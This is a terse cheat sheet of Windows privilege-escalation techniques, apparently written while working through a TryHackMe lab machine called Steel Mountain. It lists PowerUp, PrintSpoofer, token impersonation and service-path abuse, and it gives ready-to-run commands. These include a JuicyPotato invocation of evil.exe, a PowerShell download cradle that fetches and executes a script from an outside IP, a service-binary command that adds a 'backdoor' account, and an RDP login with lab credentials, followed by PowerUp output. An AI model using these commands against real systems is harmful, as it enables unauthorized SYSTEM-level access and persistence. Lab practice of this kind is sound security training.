-   [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
- Unquoted servicepath
- writable service executable
- SeImpersonatePrivilege permissions
	- load incognito
	- impersonate_token
- scheduler --> programfiles x86\\systemscheduler
	- wscheduler.exe
	- check the events directory for frequently run processes 
- [printSpoofer](https://github.com/itm4n/PrintSpoofer)
	- escalate `SeImpersonatePrivilege`
- `whoami /priv`
- `JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\evil.exe" -t \*`
- `IEX(New-Object Net.WebClient).DownloadString('http://10.10.135.179:8001/PowerUp.ps1')`
- `Install-ServiceBinary -Name AdvancedSystemCareService9 -UserName backdoor -Password Password123!`
- `xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:MACHINE_IP /u:Administrator /p:'TryH4ckM3!'`

```
ServiceName                     : AdvancedSystemCareService9             
Path                            : C:\Program Files (x86)\IObit\Advanced S
ystemCare\ASCService.exe                                                 
ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced S
ystemCare\ASCService.exe                                                 
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadCont
rol, ReadData/ListDirectory...}                                          
ModifiableFileIdentityReference : STEELMOUNTAIN\bill                     
StartName                       : LocalSystem                            
AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSy
stemCareService9'                                                        
CanRestart                      : True
```